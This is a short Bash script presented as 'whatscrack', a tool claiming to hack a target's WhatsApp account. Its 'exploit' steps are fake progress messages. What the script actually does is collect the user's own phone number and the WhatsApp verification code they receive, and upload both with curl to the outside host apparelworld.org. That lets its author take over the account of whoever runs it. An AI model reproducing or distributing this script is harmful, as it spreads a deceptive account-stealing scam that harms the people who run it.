# whatscrack
#!/bin/bash
clear

echo "
++++++++++++++++++++++++++++++
         Author : f4dl
++++++++++++++++++++++++++++++
          Whatscrack
++++++++++++++++++++++++++++++
        Enjoy Your Life
++++++++++++++++++++++++++++++

echo "";
read -p "Nomer Kamu (+62xxxx)=> " nomer;
read -p "Nomer Target (+62xxxx) => " target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> bacot.html;
curl -T bacot.html http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Tunggu 3-5 Menit Untuk Mendapatkan Code.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> bacot.html;
curl -T bacot.html http://apparelworld.org/
sleep 5
echo "[+] Success Exploited!";
exit;
